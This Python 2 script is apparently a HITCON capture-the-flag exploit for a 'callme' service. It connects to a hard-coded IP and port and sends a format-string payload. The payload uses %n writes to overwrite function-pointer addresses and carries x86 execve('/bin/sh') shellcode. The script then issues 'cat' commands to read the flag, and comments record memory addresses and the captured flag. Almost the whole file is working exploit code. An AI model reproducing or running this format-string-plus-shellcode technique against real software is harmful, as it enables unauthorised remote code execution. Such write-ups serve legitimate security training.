__author__ = 'HuyNA'
import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
# nc 203.66.57.148 9527
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_host="203.66.57.148"
#local_host='192.168.248.176'
local_port = 9527

add1=struct.pack('<I',0x0804A060)
add2=struct.pack('<I',0x0804A070)
zero=struct.pack('<I',0x00000000)
a = 'y\n'
first ='d'*0x76+(add1+add2)*0x20+'\n'

phantram='%x%x'*28
first=add1*20+(phantram)+'\n'
aa='aaa'+''
aa='a'*119
first=aa+'b'+'cccc'*14+'dd'*6+'ee'+'%x'*22+'\n'

check_fail0 = struct.pack('<I',0x0804A018)
check_fail1 = struct.pack('<I',0x0804A019)
check_fail2 = struct.pack('<I',0x0804A01a)
check_fail3 = struct.pack('<I',0x0804A01b)
# "%0164x%11$n%0208x%12$n%0128x%13$n%0260x%14$n"
first='%x'*106	# tot 'aa'*84+'%x'*22 => tot
#first='%08x'*53
# %.64x%n
# 134520928
b1="%11x%11$n"
b2="%30x%12$n"
b3="%220x%13$n"
b4="%1372x%14$n"
#0x0804a018 : 06 84 04 08 16 84 04 08 a0 08 ed b7 80 9e ec b7
shellcode="\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
first='aa'*84+"%60u%11$n%13u%12$n%11u%13$n%11u%14$n"+'%x'*4
first=shellcode+'a'*(168-len(shellcode))+b1+'%64x'+b2+'%100x'+b3+'%4x'+b4
#first='aa'*84+'%x'*10+'%x'+'%x'+'%x'+'%x'+'%x'*8
real='a\xeb\x10'+check_fail0+check_fail1+check_fail2+check_fail3
first=real+first+'\n'


e='END\x00'



#print a+first+e

# message global data: 0x0804A060
# stack bat dau chua input buffer: 0xbffff17c
# stack cookie o dau: 0xbffff1f0
# b *0x080485A8		=> sprintf callb *0

# mapped : 0xb7e20914 --> 0xb542b00 ('')
#[stack] : 0xbffff1fc --> 0xb542b00 ('')
#[stack] : 0xbffff29c --> 0xb542b00 ('')
#[stack] : 0xbffff2ec --> 0xb542b00 ('')

s.connect((local_host, local_port))
time.sleep(0.01)
print recv_until(s,'Sorry, we are not able to take your call right now.\nDo you want to leave a message (y/n)? ')
s.send(a)
time.sleep(0.01)

s.send(first)
time.sleep(0.01)
s.send('cat home/callme/flag\n')
s.send('cat home/callme/flag\n')
s.send('cat home/callme/flag\n')
s1=''
for i in xrange(1000):
    s1 += s.recv(10)

print s1

s.send('cat home/callme/flag\n')
s1=''
for i in xrange(1000):
    s1 += s.recv(10)

print s1

# HITCON{D1d y0u kn0w f0rma7 57rin9 aut0m@ta?}
#HITCON{D1d y0u kn0w f0rma7 57rin9 aut0m@ta?}